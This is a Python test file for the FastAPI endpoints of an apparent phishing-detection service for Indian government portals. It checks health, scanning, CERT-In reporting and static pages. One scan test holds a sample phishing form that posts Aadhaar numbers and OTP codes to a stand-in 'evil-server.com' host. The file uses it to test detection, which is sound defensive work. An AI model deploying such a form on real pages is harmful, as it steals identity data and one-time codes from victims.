"""
FastAPI REST Endpoints Test Suite
"""

import sys
import os

if sys.platform == 'win32' and hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from fastapi.testclient import TestClient
from main import app

client = TestClient(app)


def test_endpoints():
    print("Testing /api/health...")
    r = client.get("/api/health")
    assert r.status_code == 200
    print("  -> Health Response:", r.json())

    print("\nTesting /api/reference-sites...")
    r_ref = client.get("/api/reference-sites")
    assert r_ref.status_code == 200
    portals = r_ref.json().get("portals", [])
    print(f"  -> Successfully loaded {len(portals)} authentic portals.")

    print("\nTesting /api/scan with simulated zero-day phishing payload...")
    scan_req = {
        "url": "http://pmkisan-kyc-update.xyz",
        "html_content": "<form action='http://evil-server.com/steal.php'><input name='aadhaar_number'/><input name='otp_code' type='password'/></form>"
    }
    r_scan = client.post("/api/scan", json=scan_req)
    assert r_scan.status_code == 200
    scan_data = r_scan.json()
    print(f"  -> Target Entity: {scan_data['target_entity']}")
    print(f"  -> Verdict: {scan_data['verdict']}")
    print(f"  -> Risk Score: {scan_data['risk_score']}/100")
    print(f"  -> Summary: {scan_data['summary']}")

    print("\nTesting /api/report-certin incident reporting endpoint...")
    report_req = {
        "scan_result": scan_data,
        "reporter_notes": "Automated extension test dispatch"
    }
    r_rep = client.post("/api/report-certin", json=report_req)
    assert r_rep.status_code == 200
    rep_data = r_rep.json()
    print("  -> Status:", rep_data["status"])
    print("  -> Incident ID:", rep_data["incident_report"]["incident_id"])

    print("\nTesting static web portal root /...")
    r_web = client.get("/")
    assert r_web.status_code == 200
    assert "SatyaGov" in r_web.text or "GovShield" in r_web.text
    print("  -> Successfully served static web portal HTML.")

    print("\n" + "=" * 50)
    print("ALL FASTAPI REST ENDPOINTS TESTED & PASSED!")
    print("=" * 50)


if __name__ == "__main__":
    test_endpoints()
